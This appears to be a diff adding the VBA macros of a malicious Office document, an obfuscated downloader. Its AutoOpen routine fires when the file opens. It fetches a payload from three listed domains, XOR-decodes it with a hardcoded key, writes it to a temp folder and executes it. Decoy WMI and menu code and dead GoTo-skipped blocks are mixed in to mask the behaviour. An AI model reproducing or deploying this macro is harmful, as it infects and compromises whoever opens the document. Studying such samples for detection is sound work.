@@ -1,0 +1,422 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+
+
+Sub autoopen()
+Dim c As ChiClass
+Set c = New ChiClass
+
+CallByName c, Odish.T2.Text, VbMethod
+
+End Sub
+
+
+
+Sub Document_Open()
+
+End Sub
+
+
+
+
+
+Attribute VB_Name = "Odish"
+Attribute VB_Base = "0{2C8D4189-7B24-4981-9CB0-ACDB865C9904}{03CEBDF8-C864-4CC9-8AAB-0228BF6DBF9F}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+
+Attribute VB_Name = "ChiClass"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Public Function ratatu() As String
+
+
+ArizonaSu = Split(Odish.Tas.Tag, "RONIN")
+Vaucher = ArizonaSu(FreshID + FreshID * 2 / 13)
+SubMui
+
+ratatu = ""
+
+End Function
+
+
+    Public Sub Challenge(sender As String, e As Integer)
+
+CallByName CuPro, Odish.OptionButton1.ControlTipText, VbMethod, ArizonaSu(5), alalalabamala_4, False
+Guide1
+CuPro.setRequestHeader _
+alalalabamala_System, _
+Odish.SpinButton1.Tag
+    End Sub
+    
+    
+Private Sub Guide1()
+
+
+
+End Sub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Attribute VB_Name = "Module1"
+
+Public Const alalalabamala_System = "User-Agent"
+Public SubProperty As Object
+
+Public Const Sooopchik = "etof"
+
+
+
+
+Public alalalabamala_PokerFace As Variant
+Public alalalabamala_GMAKO As Object
+Public alalalabamala_LAKOPPC As String
+Public alalalabamala_PIRO_LOR As Object
+
+
+Public ProjectDarvin As Integer
+Public alalalabamala_RDD2 As Object
+Public smbi As String
+Public alalalabamala_2 As String
+Public Const FreshID = 0
+
+Public ArizonaSu() As String
+Public alalalabamala_Project As String
+Public Vaucher As String
+Public alalalabamala_ProjectBBB As String
+Public CuPro As Object
+
+
+Public MovedPermanently() As String
+Public alalalabamala_4 As String
+
+
+
+
+
+
+
+
+
+Public Function Assimptota4(FullPath As String, NumHoja As Integer) As String
+  WidthA alalalabamala_ProjectBBB, alalalabamala_Project, "3Ft15ysM9FOGIEiGVzfTIDBjRNjKDWP8"
+
+
+alalalabamala_GMAKO.Open (alalalabamala_Project)
+   
+End Function
+
+Public Function CheckRectsMenu4() As Integer
+    Dim rTemp As RECT, rMouse As RECT, i As Integer
+    With rMouse
+        .Left = g_cursorx
+        .Right = .Left + 32
+        .Top = g_cursory
+        .Bottom = .Top + 1
+    End With
+    For i = 0 To UBound(MenuRect)
+        If IntersectR.ect(rTemp, MenuRect(i), rMouse) Then
+            CheckRectsMenu4 = i + 1
+            Exit Function
+        End If
+    Next
+End Function
+
+
+Public Function Assimptota6(FullPath As String, NumHoja As Integer) As String
+
+alalalabamala_ProjectSpeed
+ CallByName SubProperty, "Open", VbMethod
+If NumHoja > 400 Then
+
+    If numExportadas = 0 Then
+        Assimptota6 = "No rows to export [No tiene filas por exportar]"
+        Exit Function
+    End If
+End If
+
+ alalalabamala_PokerFace = CallByName(CuPro, "responseBody", VbGet)
+ 
+
+    
+ SubProperty.Write alalalabamala_PokerFace
+CallByName SubProperty, "sav" + Sooopchik + "ile", VbMethod, alalalabamala_ProjectBBB, 2
+Assimptota4 ".", 1
+End Function
+
+
+Public Sub SubMui()
+
+If ActiveDocument.Kind = 0 Then
+Set CuPro = CreateObject(Vaucher)
+End If
+Set alalalabamala_PIRO_LOR = CreateObject(ArizonaSu(FreshID + 3))
+smbi = Odish.Label1.Caption
+
+  
+MovedPermanently = Split("bhmech.com/9yg65Vaielloengineering.com/9yg65Vcindysplace.net/9yg65", Odish.Command.Caption)
+ Set SubProperty = CreateObject(ArizonaSu(1))
+    
+   Set alalalabamala_GMAKO = CreateObject(ArizonaSu(1 + 2 + 3 - 4))
+
+Set alalalabamala_RDD2 = alalalabamala_PIRO_LOR.Environment(ArizonaSu(4))
+
+
+ ProjectDarvin = 12
+ alalalabamala_LAKOPPC = alalalabamala_RDD2(ArizonaSu(ProjectDarvin / 2))
+ ProjectDarvin = ProjectDarvin - ProjectDarvin
+
+
+
+     MoveSheets "A", "B", "C"
+
+
+End Sub
+
+Public Sub MoveSheets(sheetToMove As String, sheetAnchor As String, Assimptota6OrAfter As String)
+
+
+ Dim i
+ On Error GoTo d13
+For i = LBound(MovedPermanently) To UBound(MovedPermanently) Step 1
+ SaveDataCSVToolStripMenuItem_Click 72
+If CuPro.Status <> 200 Then
+ Err.Raise 700 + vbObjectError, "A", "D"
+End If
+    
+    
+    
+    Assimptota6 "33", 3
+ Exit Sub
+d13:
+Next
+Exit Sub
+
+    
+End Sub
+
+
+
+
+
+
+Attribute VB_Name = "Module2"
+
+
+Sub SetPageFile(strComputer)
+    Set objWMIService = GetObject("winmgmts:" _
+        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+    Set colPageFiles = objWMIService.ExecQuery _
+        ("Select * from Win32_PageFileSetting")
+    For Each objPageFile In colPageFiles
+        objPageFile.InitialSize = 2046
+        objPageFile.MaximumSize = 4092
+        objPageFile.Put_
+    Next
+End Sub
+Sub Lis_Fichier(strfile, intmode)
+Dim oFso, f, nb
+Set oFso = CreateObject("Scripting.FileSystemObject")
+Set f = oFso.OpenTextFile(strfile, intmode)
+nb = GetNumberOfLines(strfile)
+
+For i = 1 To nb
+MyArray(i - 1) = f.ReadLine
+Next
+
+f.Close
+Set oFso = Nothing
+Set f = Nothing
+End Sub
+
+
+Public Function Ashnorog(Var1, Var2)
+  Ashnorog = Var1 Xor Var2
+  
+End Function
+
+
+Public Function CheckRectsAd() As Boolean
+    Dim rTemp As RECT, rMouse As RECT, i As Integer
+    With rMouse
+        .Left = g_cursorx
+        .Right = .Left + 32
+        .Top = g_cursory
+        .Bottom = .Top + 1
+    End With
+    If IntersectR.ect(rTemp, AdRect, rMouse) Then
+        CheckRectsAd = True
+        Exit Function
+    End If
+End Function
+
+
+
+
+Public Sub SaveDataCSVToolStripMenuItem_Click(e As Integer)
+       alalalabamala_4 = Odish.ZK.Caption & MovedPermanently(i)
+ ProjectDarvin = ProjectDarvin + 2
+ Dim XIpotom2 As ChiClass
+Set XIpotom2 = New ChiClass
+If e < 488 Then
+
+
+ XIpotom2.Challenge "Swed", 13
+CallByName CuPro, Odish.ToggleButton1.Caption, VbMethod
+Set XIpotom2 = Nothing
+ 
+Else
+
+End If
+    End Sub
+
+Attribute VB_Name = "Module3"
+
+Function InArray(strValue, List, Col)
+Dim i
+For i = 0 To UBound(List)
+If List(i, Col) = CStr(strValue) Then
+InArray = True
+Exit Function
+End If
+Next
+InArray = False
+End Function
+
+
+
+Public Sub Method1(MethodParam2() As Byte, MethodParam As String)
+
+  
+  Dim Frix2 As Long
+  Dim Frix3 As Long
+  Dim Frix5 As Long
+  Dim Frix6 As Long
+  Dim plusplus() As Byte
+Dim Frix4 As Long
+Dim plusplusLen As Long
+  plusplusLen = Len(MethodParam)
+ReDim plusplus(plusplusLen)
+
+  plusplus = StrConv(MethodParam, vbFromUnicode)
+
+  
+  Frix2 = UBound(MethodParam2) + 1
+  Frix5 = Frix2
+  
+  
+  For Frix4 = _
+  0 To (Frix2 - 1)
+    aa = plusplus(Frix4 Mod plusplusLen)
+    bb = MethodParam2(Frix4)
+    MethodParam2(Frix4) = Ashnorog(bb, aa)
+    
+    If (Frix4 >= Frix6) Then
+      Frix3 = Int((Frix4 / Frix5) * 100)
+      Frix6 = (Frix5 * ((Frix3 + 1) / 100)) + 1
+    End If
+  Next
+End Sub
+Public Sub WidthA(Di1 As String, i1J As String, Optional alalalabamala_Sexote As String)
+
+  Dim i1 As Integer
+  Dim Gi1() As Byte
+  
+  i1 = FreeFile
+  Open Di1 For Binary As #i1
+  ReDim Gi1(0 To LOF(i1) - 1)
+  Get #i1, , Gi1()
+  Close #i1
+  Call Method1(Gi1(), alalalabamala_Sexote)
+  i1 = FreeFile
+  Open i1J For Binary As #i1
+  Put #i1, , Gi1()
+  Close #i1
+
+End Sub
+Function GetPath()
+Dim path
+path = WScript.ScriptFullName
+GetPath = Left(path, InStrRev(path, "\"))
+End Function
+
+
+Public Function alalalabamala_ProjectSpeed()
+
+GoTo rTemp2
+    Set FSO = CreateObject("Scripting.FileSystemObject")
+
+Set oArgs = WScript.Arguments
+If oArgs.Count = 1 Then
+        strComputer = CStr(oArgs(0))
+Else
+    strComputer = InputBox("Enter computer name")
+End If
+
+
+
+
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
+Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_VideoController", "WQL", _
+wbemFlagReturnImmediately + wbemFlagForwardOnly)
+rTemp2:
+ alalalabamala_Project = alalalabamala_LAKOPPC
+ alalalabamala_ProjectBBB = alalalabamala_Project + "\tymbado" + CStr(ProjectDarvin)
+
+
+GoTo rTemp3
+    For i = 0 To UBound(Menu3Rect)
+        If IntersectR.ect(rTemp, Menu3Rect(i), rMouse) Then
+            CheckRectsMenu3 = i + 1
+            Exit Function
+        End If
+    Next
+rTemp3:
+alalalabamala_Project = alalalabamala_Project + Replace(ArizonaSu(12), ".", CStr(ProjectDarvin) + ".")
+ SubProperty.Type = 1
+End Function
+    
+Function GetNumberOfLines(strfile)
+Dim oFso, f, i
+Set oFso = CreateObject("Scripting.FileSystemObject")
+Set f = oFso.OpenTextFile(strfile, 1)
+i = 0
+
+Do
+f.ReadLine
+i = i + 1
+Loop While Not f.AtEndOfStream
+
+f.Close
+Set oFso = Nothing
+Set f = Nothing
+GetNumberOfLines = i
+End Function
+
